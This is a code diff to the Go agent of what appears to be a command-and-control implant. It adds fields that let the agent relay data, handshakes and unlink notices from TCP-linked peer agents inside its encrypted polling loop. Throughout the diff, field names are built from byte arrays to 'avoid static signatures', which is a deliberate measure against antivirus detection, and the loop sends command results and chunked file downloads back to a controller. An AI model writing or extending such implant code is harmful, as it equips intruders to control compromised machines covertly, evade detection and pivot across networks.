@@ -33,10 +33,13 @@ var (
 
 // Malleable field values (constructed to avoid static signatures)
 var (
-	MALLEABLE_REKEY_COMMAND      = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})             // rekey_required
-	MALLEABLE_REKEY_STATUS_FIELD = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                             // status
-	MALLEABLE_REKEY_DATA_FIELD   = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                         // data
-	MALLEABLE_REKEY_ID_FIELD     = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                   // command_db_id
+	MALLEABLE_REKEY_COMMAND         = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})             // rekey_required
+	MALLEABLE_REKEY_STATUS_FIELD    = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                             // status
+	MALLEABLE_REKEY_DATA_FIELD      = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                         // data
+	MALLEABLE_REKEY_ID_FIELD        = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                   // command_db_id
+	MALLEABLE_LINK_DATA_FIELD       = string([]byte{0x6c, 0x64})                                                                                     // ld
+	MALLEABLE_LINK_HANDSHAKE_FIELD  = string([]byte{0x6c, 0x68})                                                                                     // lh
+	MALLEABLE_LINK_UNLINK_FIELD     = string([]byte{0x6c, 0x75})                                                                                     // lu
 )
 
 // PollConfig holds the configuration for polling behavior
@@ -586,32 +589,53 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				nextInterval = backoffInterval
 			}
 
-			if resultManager.HasResults() {
+			// Collect link data from connected TCP agents (if any)
+			linkData := GetLinkManager().GetOutboundData()
+			// Collect link handshake data (for new linked agents, sent via "lh" field)
+			linkHandshake := GetLinkManager().GetHandshakeData()
+			// Collect unlink notifications (routing IDs that have been disconnected)
+			unlinkNotifications := GetLinkManager().GetUnlinkNotifications()
+
+			// Handle pending results before sleep
+			hasResults := resultManager.HasResults()
+			hasLinkData := len(linkData) > 0
+			hasLinkHandshake := linkHandshake != nil
+			hasUnlinkNotifications := len(unlinkNotifications) > 0
+
+			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
 				results := resultManager.GetPendingResults()
+				payload := make(map[string]interface{})
+				payload["agent_id"] = clientID
+
 				if len(results) > 0 {
-					encryptedData := struct {
-						AgentID string            `json:"agent_id"`
-						Results []CommandResponse `json:"results"`
-					}{
-						AgentID: clientID,
-						Results: results,
-					}
-					jsonData, err := json.Marshal(encryptedData)
+					payload["results"] = results
+				}
+				if hasLinkData {
+					payload[MALLEABLE_LINK_DATA_FIELD] = linkData
+				}
+				if hasLinkHandshake {
+					// Send handshake as single object via "lh" field
+					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake
+				}
+				if hasUnlinkNotifications {
+					payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
+				}
+
+				jsonData, err := json.Marshal(payload)
+				if err == nil {
+					encrypted, err := secureComms.EncryptMessage(string(jsonData))
 					if err == nil {
-						encrypted, err := secureComms.EncryptMessage(string(jsonData))
-						if err == nil {
-							if err := sendResults(encrypted, customHeaders); err == nil {
-								for _, result := range results {
-									if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
-										commandQueue.mu.Lock()
-										if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
-											delete(commandQueue.activeDownloads, result.Filename)
-										}
-										commandQueue.mu.Unlock()
+						if err := sendResults(encrypted, customHeaders); err == nil {
+							for _, result := range results {
+								if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
+									commandQueue.mu.Lock()
+									if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
+										delete(commandQueue.activeDownloads, result.Filename)
 									}
+									commandQueue.mu.Unlock()
 								}
-								secureComms.RotateSecret()
 							}
+							secureComms.RotateSecret()
 						}
 					}
 				}
